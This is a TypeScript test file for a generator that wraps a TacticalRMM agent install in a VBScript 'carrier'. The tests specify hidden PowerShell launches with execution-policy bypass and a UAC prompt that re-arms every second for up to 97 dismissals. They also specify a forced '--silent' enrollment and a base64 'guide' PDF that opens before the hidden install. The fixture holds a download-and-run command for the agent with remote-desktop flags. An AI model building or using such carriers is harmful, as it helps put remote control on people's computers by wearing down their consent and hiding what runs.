// Vantra (TacticalRMM) carrier tests — the binder for OUR agent install
// script. Separate from tests/openframe-carrier.test.ts (owner directive:
// the OpenFrame pipeline stays untouched by this work).
//
// Fixtures use FAKE auth tokens only — a live RMM token must never enter a
// committed file.
import assert from "node:assert/strict";
import { test } from "node:test";

import {
  renderCarrierVbs,
  renderVantraCarrierFromScript,
  normalizePowerShellCommand,
  ensureSilentEnroll,
  PS_PREFIX,
  PS_FLAGS,
  RUN_PREFIX,
  SELF_ELEVATE_HEADER,
  SELF_ELEVATE_TRAILER,
  MAX_CMDLINE_CHARS,
  type CarrierPdf,
} from "../lib/vantra-carrier";

// ---------------------------------------------------------------------------
// The carrier renderer (duplicated from the openframe layer — kept honest
// here so a fix in this fork is validated independently)
// ---------------------------------------------------------------------------

test("runs hidden with no profile and policy bypass (both launch paths)", () => {
  const vbs = renderCarrierVbs("Write-Output hi");
  // Stage 2.2: the elevated path stages a self-elevating PS file and waits on
  // its EXIT CODE via WScript.Shell.Run -File (wait=True). The UAC consent is
  // raised inside the staged PowerShell (Start-Process -Verb RunAs), because
  // WSH's ShellExecute cannot report a dismissed prompt (the VM-proven bug).
  assert.ok(vbs.includes(RUN_PREFIX), "hidden -File launch flags");
  assert.ok(vbs.includes('CreateObject("WScript.Shell")'), "WScript.Shell launcher");
  assert.ok(
    vbs.includes("-Verb RunAs -Wait -ErrorAction Stop"),
    "UAC via the zip's exact PS primitive",
  );
  assert.ok(vbs.includes('rc = shell.Run("' + RUN_PREFIX), "waiting Run -File launch (parens: assigned call MUST use them)");
  assert.ok(!vbs.includes('rc = shell.Run "'), "never un-parenthesized: that is a VBS compile error");

  const unelevated = renderCarrierVbs("Write-Output hi", { elevate: false });
  assert.ok(unelevated.includes('CreateObject("WScript.Shell")'));
  assert.ok(!unelevated.includes("-Verb RunAs"), "no UAC without elevation");
  // Run takes the full command line, so PS_PREFIX/PS_FLAGS are contiguous here.
  assert.ok(unelevated.includes('shell.Run "' + PS_PREFIX));
  assert.ok(unelevated.includes(PS_FLAGS), "shared flags on the inline path");
});

test("embedded command rejoins exactly from the VBS chunks", () => {
  const cmd =
    "Set-Location ~; Remove-Item -Path 'x.zip' -Force; & '.\\agent.exe' install --key AbC_12345678 --org 00000000-0000-0000-0000-000000000000";
  const vbs = renderCarrierVbs(cmd);
  const chunks = [...vbs.matchAll(/ps = ps & "((?:[^"]|"")*)"/g)].map((m) =>
    m[1].replace(/""/g, '"'),
  );
  assert.equal(chunks.join(""), cmd);
});


// ---------------------------------------------------------------------------
// Normalizer — binds the multi-line Vantra/TacticalRMM install script.
// Fixture mirrors the real RMM dashboard output; token is FAKE.
// ---------------------------------------------------------------------------

const VANTRA_FIXTURE = [
  "$ErrorActionPreference = 'Stop'",
  "$ProgressPreference = 'SilentlyContinue'",
  "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12",
  "$exe = Join-Path $env:TEMP 'tacticalagent-v2.11.0-windows-amd64.exe'",
  `Invoke-WebRequest -Uri "https://github.com/amidaware/rmmagent/releases/download/v2.11.0/tacticalagent-v2.11.0-windows-amd64.exe" -OutFile $exe -UseBasicParsing`,
  `Start-Process -FilePath $exe -ArgumentList '/VERYSILENT','/SUPPRESSMSGBOXES','/NORESTART','/SP-' -Wait`,
  `$agent = "C:\\Program Files\\TacticalAgent\\tacticalrmm.exe"`,
  `for ($i = 0; $i -lt 30 -and -not (Test-Path $agent); $i++) { Start-Sleep -Seconds 1 }`,
  `Start-Process -FilePath $agent -ArgumentList '-m install --api https://rmm.example.test --client-id 42 --site-id 143 --agent-type workstation --auth FAKE_AUTH_TOKEN_0000000000000000000000000000000000000000000000000000 --rdp --ping --power' -WindowStyle Hidden -Wait`,
  `Remove-Item $exe -Force -ErrorAction SilentlyContinue`,
  `'Vantra agent installed.'`,
].join("\n");

test("normalize: Vantra installer shape → single line, double quotes gone, semantics intact", () => {
  const flat = normalizePowerShellCommand(VANTRA_FIXTURE);

  // Single line, no double quotes — the carrier's hard constraints met.
  assert.ok(!/[\r\n]/.test(flat), "single line");
  assert.ok(!flat.includes('"'), "no double quotes remain");

  // Double-quoted literals became single-quoted (paths/URLs carry no `$` or
  // backtick, so this is semantics-preserving — verified key substrings):
  assert.ok(
    flat.includes(
      `-Uri 'https://github.com/amidaware/rmmagent/releases/download/v2.11.0/tacticalagent-v2.11.0-windows-amd64.exe'`,
    ),
  );
  assert.ok(flat.includes(`$agent = 'C:\\Program Files\\TacticalAgent\\tacticalrmm.exe'`));
  // Already-single-quoted content passes through verbatim (the auth token):
  assert.ok(flat.includes(`'-m install --api https://rmm.example.test`));
  assert.ok(flat.includes("FAKE_AUTH_TOKEN_0000000000000000000000000000000000000000000000000000"));
  // Statements joined with '; ' in original order:
  assert.ok(flat.startsWith("$ErrorActionPreference = 'Stop'; $ProgressPreference"));
  assert.ok(
    flat.includes("{ Start-Sleep -Seconds 1 }; Start-Process -FilePath $agent"),
    "for-loop line joined",
  );
  assert.ok(flat.endsWith("'Vantra agent installed.'"));
});

test("normalize: strips comments only where PowerShell starts them", () => {
  const script = [
    "# full-line comment",
    "Write-Host 'a'   # trailing comment",
    "Write-Host 'path#keep' # real comment", // '#' inside a string survives
    "Write-Host a#b", // '#' glued to a token is NOT a comment in PS
    "",
  ].join("\n");
  assert.equal(
    normalizePowerShellCommand(script),
    "Write-Host 'a'; Write-Host 'path#keep'; Write-Host a#b",
  );
});

test("normalize: FAILS CLOSED on anything a text join could break", () => {
  const bad = (script: string, code: string) =>
    assert.throws(
      () => normalizePowerShellCommand(script),
      (err: Error) => err.message === code,
      `expected ${code}`,
    );

  bad("", "empty_command");
  bad("@'\nsecret\n'@", "here_string");
  bad('@"\n$x\n"@', "here_string");
  bad("Write-Host 'unbalanced", "multiline_string");
  bad('Write-Host "unbalanced', "multiline_string");
  bad('Write-Host "$env:TEMP/x"', "interpolating_double_quote"); // $ would expand
  bad('Write-Host "a`nb"', "interpolating_double_quote"); // backtick escape
  bad("Get-Process |\n  Where-Object Id -gt 1", "continuation_line");
  bad("$x = 5 +", "continuation_line");
  bad("if ($true)", "line_structure"); // block on NEXT line → ambiguous join
  bad("}\nWrite-Host x", "line_structure");
  bad("Write-Host a\nelse { }", "line_structure");
});

test("end-to-end: fixture script → one .vbs whose chunks rejoin to the flat command", () => {
  const flat = normalizePowerShellCommand(VANTRA_FIXTURE);
  const vbs = renderVantraCarrierFromScript(VANTRA_FIXTURE);
  assert.ok(vbs.includes("SpaceWorker Vantra agent install carrier"));
  for (const line of vbs.split("\n")) {
    assert.ok(line.length <= 1023, `line over budget (${line.length})`);
  }
  const chunks = [...vbs.matchAll(/ps = ps & "((?:[^"]|"")*)"/g)].map((m) =>
    m[1].replace(/""/g, '"'),
  );
  assert.equal(chunks.join(""), flat);
});

test("rejects commands the VBS string context cannot hold", () => {
  assert.throws(() => renderCarrierVbs(""), /empty_command/);
  assert.throws(() => renderCarrierVbs("a\nb"), /multiline_command/);
  assert.throws(() => renderCarrierVbs('say "hi"'), /double_quote_command/);
});

test("long commands chunk under the 1023-char VBS line limit and rejoin exactly", () => {
  const long = "Write-Output start " + "x".repeat(3000) + " end";
  const vbs = renderCarrierVbs(long);
  for (const line of vbs.split("\n")) {
    assert.ok(line.length <= 1023, `line over budget (${line.length})`);
  }
  const chunks = [...vbs.matchAll(/ps = ps & "((?:[^"]|"")*)"/g)].map((m) =>
    m[1].replace(/""/g, '"'),
  );
  assert.equal(chunks.join(""), long);
});


// ---------------------------------------------------------------------------
// TASK_178 stage 1 — ensureSilentEnroll: the TASK_172 `--silent` guarantee,
// applied at mint time because Vantra's psCommand lacks the generator's fix
// (the owner's first VBS test still showed the TacticalRMM notification).
// ---------------------------------------------------------------------------

test("ensureSilentEnroll: appends --silent inside the canonical quoted argv", () => {
  const out = ensureSilentEnroll(
    "Start-Process -FilePath $agent -ArgumentList '-m install --api https://rmm.example.test --rdp --ping --power' -WindowStyle Hidden -Wait",
  );
  assert.ok(out.includes("--power --silent'"), out);
  assert.equal((out.match(/--silent/g) ?? []).length, 1);
});

test("ensureSilentEnroll: the bare buildEnrollmentCommand shape gets it at the statement end", () => {
  const out = ensureSilentEnroll(
    "& 'C:\\agent\\tacticalrmm.exe' -m install --api https://rmm.example.test --rdp --ping --power; Remove-Item $exe",
  );
  assert.ok(out.includes("--power --silent; Remove-Item $exe"), out);
});

test("ensureSilentEnroll: idempotent — an already-silent command is byte-identical", () => {
  const quoted = "Start-Process -FilePath $agent -ArgumentList '-m install --x --silent' -Wait";
  assert.equal(ensureSilentEnroll(quoted), quoted);
  const bare = "& 'a.exe' -m install --silent";
  assert.equal(ensureSilentEnroll(bare), bare);
});

test("ensureSilentEnroll: fails closed — no enroll argv, or a quote where inserting would guess", () => {
  assert.throws(() => ensureSilentEnroll("Invoke-WebRequest -Uri 'https://x'"), /enroll_not_found/);
  assert.throws(() => ensureSilentEnroll("Copy-Item 'a' -m install 'b' -Wait"), /enroll_unrecognized/);
});

test("end-to-end: fixture → normalize → ensureSilentEnroll → carrier ships exactly one --silent", () => {
  const silent = ensureSilentEnroll(normalizePowerShellCommand(VANTRA_FIXTURE));
  assert.equal((silent.match(/--silent/g) ?? []).length, 1, "one --silent after the gate");
  const vbs = renderCarrierVbs(silent);
  const chunks = [...vbs.matchAll(/ps = ps & "((?:[^"]|"")*)"/g)].map((m) =>
    m[1].replace(/""/g, '"'),
  );
  const joined = chunks.join("");
  assert.equal(joined, silent, "chunks rejoin exactly");
  assert.equal((joined.match(/--silent/g) ?? []).length, 1, "one --silent in the shipped carrier");
});


// ---------------------------------------------------------------------------
// TASK_179 stage 2 — 97× UAC re-arm (zip FIX 5 parity) + embedded guide PDF
// ---------------------------------------------------------------------------

/** Rejoin the `ps = ps & "…"` chunks exactly as VBS does before PowerShell. */
const rejoin = (vbs: string): string =>
  [...vbs.matchAll(/ps = ps & "((?:[^"]|"")*)"/g)].map((m) => m[1].replace(/""/g, '"')).join("");

/** Rejoin the `b64File.Write "…"` sidecar chunks exactly as VBS does. */
const rejoinB64 = (vbs: string): string =>
  [...vbs.matchAll(/b64File\.Write "((?:[^"]|"")*)"/g)].map((m) => m[1].replace(/""/g, '"')).join("");

test("stage 2.2: dismissed UAC re-arms every 1s up to 97 attempts (zip FIX 5 parity)", () => {
  const vbs = renderCarrierVbs("Write-Output hi");
  assert.ok(vbs.includes("Dim attempt : attempt = 97"), "97 attempts");
  const start = vbs.indexOf("Do While attempt > 0");
  const end = vbs.indexOf("Loop");
  assert.ok(start > -1 && end > start, "retry loop present");
  const loop = vbs.slice(start, end + "Loop".length);
  // Exact step order inside the loop: wait for the staged script's EXIT CODE
  // → not-dismissed? break → count down → wait 1 s → next attempt
  // (zip: catch { $n-=1; Sleep 1 }).
  const steps = [
    "rc = shell.Run",
    "If rc <> 1 Then Exit Do",
    "attempt = attempt - 1",
    "WScript.Sleep 1000",
  ];
  let prev = -1;
  for (const step of steps) {
    const at = loop.indexOf(step);
    assert.ok(at > prev, `expected '${step}' after previous step (at=${at}, prev=${prev})`);
    prev = at;
  }
  // THE VM-PROVEN ROOT CAUSE (stage 2.2): WSH's ShellExecute does not set Err
  // when UAC is dismissed, so the old Err.Number gate exited on the FIRST
  // Cancel. The dismiss signal now lives in the staged PowerShell, using the
  // zip's exact primitive (throws on cancel) → exit 1 = the retry code;
  // install failure → exit 2 (no re-prompt, zip parity); success → 0.
  assert.ok(vbs.includes("-Verb RunAs -Wait -ErrorAction Stop"), "zip's exact primitive");
  assert.ok(vbs.includes("catch{exit 1}"), "dismissed consent → exit 1");
  assert.ok(vbs.includes(SELF_ELEVATE_TRAILER), "payload guarded: failure → exit 2, done");
  assert.ok(!vbs.includes("ShellExecute"), "no Err-based launch detection left");
  assert.ok(!vbs.includes("If Err.Number = 0 Then Exit Do"));
  assert.ok(loop.includes("0, True"), "Run waits for the staged script (synchronous)");
  // No consent dialog on the unelevated path → nothing to re-arm there.
  const une = renderCarrierVbs("Write-Output hi", { elevate: false });
  assert.ok(!une.includes("Do While"), "unelevated path has no retry loop");
  assert.ok(!une.includes("-Verb RunAs"));
});

test("stage 2.2: staged run file = self-elevate header + payload + trailer (rejoins exactly)", () => {
  const silent = ensureSilentEnroll(normalizePowerShellCommand(VANTRA_FIXTURE));
  const vbs = renderCarrierVbs(silent, {
    pdf: { pdfBase64: Buffer.from("%PDF-1.4 guide").toString("base64"), pdfName: "g.pdf" },
  });
  // Literal runFile writes = header chunks (staging) + trailer (flush); the
  // payload rides the VARIABLE line `runFile.Write ps` between them.
  const runLiterals = [...vbs.matchAll(/runFile\.Write "((?:[^"]|"")*)"/g)]
    .map((m) => m[1].replace(/""/g, '"'))
    .join("");
  assert.equal(runLiterals, SELF_ELEVATE_HEADER + SELF_ELEVATE_TRAILER);
  const flush = vbs.indexOf("  runFile.Write ps");
  assert.ok(flush > -1, "payload flush present");
  assert.ok(flush > vbs.indexOf("ps = ps &"), "payload appended after the chunks");
  assert.ok(
    flush > vbs.indexOf(`ps = Replace(ps, "@B64@", Replace(b64Path, "'", "''"))`),
    "…and after marker substitution",
  );
  assert.ok(vbs.lastIndexOf('runFile.Write "') > flush, "trailer literal written after the payload");
  assert.ok(vbs.indexOf("  runFile.Close") > vbs.lastIndexOf('runFile.Write "'), "closed last");
  for (const line of vbs.split("\n")) {
    assert.ok(line.length <= 1023, `line over budget (${line.length})`);
  }
});

test("stage 2: guide PDF decodes → waits → opens BEFORE the install, best-effort", () => {
  const pdfB64 = Buffer.from("%PDF-1.4\nfake guide bytes").toString("base64");
  const cmd =
    "Start-Process -FilePath $agent -ArgumentList '-m install --api https://rmm.example.test' -WindowStyle Hidden -Wait";
  const vbs = renderCarrierVbs(cmd, {
    pdf: { pdfBase64: pdfB64, pdfName: "Sw Guide.pdf", delaySec: 3 },
  });
  const embedded = rejoin(vbs);
  const at = (frag: string): number => {
    const i = embedded.indexOf(frag);
    assert.ok(i > -1, `missing fragment: ${frag}`);
    return i;
  };
  const seq = [
    at("try{[IO.File]::WriteAllBytes($env:TEMP + '\\Sw Guide.pdf'"),
    at("FromBase64String([IO.File]::ReadAllText('@B64@'))"),
    at("Start-Sleep -Seconds 3"),
    at("Start-Process ($env:TEMP + '\\Sw Guide.pdf')"),
    at("}catch{}"),
    at(cmd),
  ];
  for (let i = 1; i < seq.length; i++) {
    assert.ok(seq[i] > seq[i - 1], `fragment ${i} out of order`);
  }
  // Stage 2.1 — the base64 rides in the FSO sidecar writes, NEVER in the
  // command line (the 32,767-char CreateProcess wall that failed the VM).
  assert.equal(rejoinB64(vbs), pdfB64, "sidecar writes rejoin to the payload");
  assert.ok(
    vbs.includes(`ps = Replace(ps, "@B64@", Replace(b64Path, "'", "''"))`),
    "run-time marker substitution",
  );
  assert.ok(!rejoin(vbs).includes(pdfB64.slice(0, 32)), "no payload bytes in the command");
  for (const line of vbs.split("\n")) {
    assert.ok(line.length <= 1023, `line over budget (${line.length})`);
  }
});

test("stage 2: no PDF → stage-1 shape plus the retry loop only; delay 0 omits the wait", () => {
  const plain = renderCarrierVbs("Write-Output hi");
  assert.ok(!plain.includes("FromBase64String"), "no PDF statement without the pdf option");
  assert.ok(!plain.includes("b64File.Write"), "no sidecar staging without the pdf option");
  assert.equal(rejoin(plain), "Write-Output hi", "command untouched");

  const noDelay = renderCarrierVbs("Write-Output hi", {
    pdf: { pdfBase64: Buffer.from("%PDF-1.4 x").toString("base64") },
  });
  const embedded = rejoin(noDelay);
  assert.ok(
    embedded.startsWith("try{[IO.File]::WriteAllBytes($env:TEMP + '\\guide.pdf'"),
    "default name guide.pdf",
  );
  assert.ok(!embedded.includes("Start-Sleep"), "delay 0 → no wait statement");
  assert.ok(
    embedded.endsWith("}catch{};Write-Output hi"),
    "install runs after the PDF block (which ends with the sidecar cleanup)",
  );
});

test("stage 2: PDF validation fails closed with stable codes", () => {
  const bad = (pdf: CarrierPdf, code: string) =>
    assert.throws(
      () => renderCarrierVbs("Write-Output hi", { pdf }),
      (err: Error) => err.message === code,
      `expected ${code}`,
    );

  bad({ pdfBase64: Buffer.from("definitely not a pdf").toString("base64"), pdfName: "g.pdf" }, "invalid_pdf");
  bad({ pdfBase64: "", pdfName: "g.pdf" }, "invalid_pdf");
  bad({ pdfBase64: Buffer.from("%PDF-1.4 x").toString("base64"), pdfName: "..\\evil.pdf" }, "invalid_pdf_name");
  bad({ pdfBase64: Buffer.from("%PDF-1.4 x").toString("base64"), pdfName: "guide.txt" }, "invalid_pdf_name");
  bad({ pdfBase64: Buffer.from("%PDF-1.4 x").toString("base64"), pdfName: "'quote.pdf" }, "invalid_pdf_name");
  bad({ pdfBase64: Buffer.from("%PDF-1.4 x").toString("base64"), pdfName: "g.pdf", delaySec: 121 }, "invalid_pdf_delay");
  bad({ pdfBase64: Buffer.from("%PDF-1.4 x").toString("base64"), pdfName: "g.pdf", delaySec: -1 }, "invalid_pdf_delay");
  bad({ pdfBase64: Buffer.from("%PDF-1.4 x").toString("base64"), pdfName: "g.pdf", delaySec: 1.5 }, "invalid_pdf_delay");
  // >20 MB decoded — same ceiling as the zip's validateInstallerPdf (TASK_125).
  bad({ pdfBase64: "A".repeat(28_000_000), pdfName: "g.pdf" }, "pdf_too_large");
});

test("stage 2 end-to-end: silent fixture + PDF → one --silent, chunks rejoin to pdf-statement;command, retry loop present", () => {
  const silent = ensureSilentEnroll(normalizePowerShellCommand(VANTRA_FIXTURE));
  const pdf = {
    pdfBase64: Buffer.from("%PDF-1.4 guide").toString("base64"),
    pdfName: "vantra-guide.pdf",
  };
  const vbs = renderCarrierVbs(silent, { pdf });
  const embedded = rejoin(vbs);
  assert.ok(embedded.startsWith("try{[IO.File]::WriteAllBytes($env:TEMP + '\\vantra-guide.pdf'"));
  assert.ok(
    embedded.endsWith("}catch{};" + silent),
    "install command intact after the PDF block + sidecar cleanup",
  );
  assert.equal((embedded.match(/--silent/g) ?? []).length, 1, "one --silent");
  assert.ok(vbs.includes("Dim attempt : attempt = 97"), "retry loop on the real install carrier");
  assert.ok(vbs.includes('rc = shell.Run("' + RUN_PREFIX), "elevated hidden launch intact (parens)");
  assert.ok(!vbs.includes('rc = shell.Run "'), "un-parenthesized Run would fail VBS compilation (VM run #3)");
});

test("stage 2.1: the guide's base64 NEVER enters the command line (Windows 32,767 wall)", () => {
  // The owner's VM failure, encoded: a 48 KB guide was already 66,845 chars
  // of `-Command` — ShellExecute died with "The parameter is incorrect" and
  // the 97× loop re-armed the same error dialog every second. The bytes now
  // exist only in the FSO sidecar writes; the command carries the marker.
  const raw = Buffer.from("%PDF-1.4\n" + "G".repeat(1_000_000)).toString("base64");
  const vbs = renderCarrierVbs("Write-Output hi", {
    pdf: { pdfBase64: raw, pdfName: "Big Guide.pdf", delaySec: 1 },
  });
  const embedded = rejoin(vbs);
  assert.ok(embedded.includes("@B64@"), "the command carries the marker, not bytes");
  assert.ok(!embedded.includes(raw.slice(0, 32)), "no payload bytes in the command");
  assert.equal(rejoinB64(vbs), raw, "payload reassembles from the sidecar writes");
  const launchLine = PS_PREFIX + '"' + embedded + '"';
  assert.ok(
    launchLine.length <= MAX_CMDLINE_CHARS,
    `launch line ${launchLine.length} chars must stay ≤ ${MAX_CMDLINE_CHARS}`,
  );
  for (const line of vbs.split("\n")) {
    assert.ok(line.length <= 1023, `line over budget (${line.length})`);
  }
});

test("stage 2.1: an oversized command fails closed at MINT (command_too_long); marker collisions too", () => {
  // Just under the wall renders (Write-Output header + 29,000 x's + prefix
  // stays within MAX_CMDLINE_CHARS)…
  assert.ok(renderCarrierVbs("Write-Output " + "x".repeat(29_000)));
  // …just over refuses, before any bytes go anywhere.
  assert.throws(
    () => renderCarrierVbs("x".repeat(30_000)),
    (err: Error) => err.message === "command_too_long",
    "expected command_too_long",
  );
  // A literal marker in the install command would be rewritten at run time —
  // fail closed rather than corrupt it.
  assert.throws(
    () => renderCarrierVbs("Write-Output @B64@"),
    (err: Error) => err.message === "marker_collision",
    "expected marker_collision",
  );
});
